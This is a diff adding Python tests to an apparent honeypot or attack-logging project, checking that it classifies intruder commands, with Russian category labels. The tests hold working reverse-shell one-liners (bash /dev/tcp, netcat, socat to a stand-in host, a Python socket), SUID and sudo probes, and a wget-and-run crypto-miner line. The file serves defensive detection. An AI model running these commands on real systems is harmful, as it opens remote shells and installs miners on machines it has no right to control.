@@ -160,3 +160,36 @@ def test_attack_classification():
     assert classify(["echo root:x | chpasswd"]) == "захват аккаунта"
     assert classify(["uname -a", "whoami"]) == "разведка системы"
     assert classify(["foo"]) == "прочее"
+
+
+def test_revshell_and_privesc_detection():
+    from ghoul import patterns
+
+    cases = {
+        "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1": ("bash /dev/tcp", "203.0.113.7:4444"),
+        "nc -e /bin/sh 203.0.113.7 9001": ("netcat -e/-c", "203.0.113.7:9001"),
+        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.7 4242 >/tmp/f": ("netcat + mkfifo", "203.0.113.7:4242"),
+        "socat TCP:evil.example.net:4444 EXEC:/bin/sh": ("socat", "evil.example.net:4444"),
+        "python3 -c 'import socket;s=socket.socket();s.connect((\"203.0.113.7\",4444))'": ("python socket", "203.0.113.7:4444"),
+    }
+    for line, (technique, target) in cases.items():
+        events = patterns.detect(line)
+        assert events and events[0][0] == "revshell", line
+        assert events[0][1] == {"technique": technique, "target": target}, line
+    assert patterns.detect("ls -la /root") == []
+    assert patterns.detect("nc -zv 203.0.113.7 22") == []  # скан портов, не реверс-шелл
+    techniques = [d["technique"] for k, d in patterns.detect("find / -perm -4000 2>/dev/null; sudo -l") if k == "privesc"]
+    assert "поиск suid" in techniques and "sudo -l" in techniques
+
+
+def test_shell_emits_revshell_event_and_classifies():
+    sh, events = make_shell()
+    sh.run_line("bash -i >& /dev/tcp/203.0.113.7/4444 0>&1")
+    assert ("revshell", {"technique": "bash /dev/tcp", "target": "203.0.113.7:4444"}) in events
+    assert "ALL" in sh.run_line("sudo -l")
+
+
+def test_miner_classification():
+    from ghoul.dashboard import classify
+
+    assert classify(["cd /tmp; wget http://203.0.113.5/.xmr; ./.xmr"]) == "майнер"
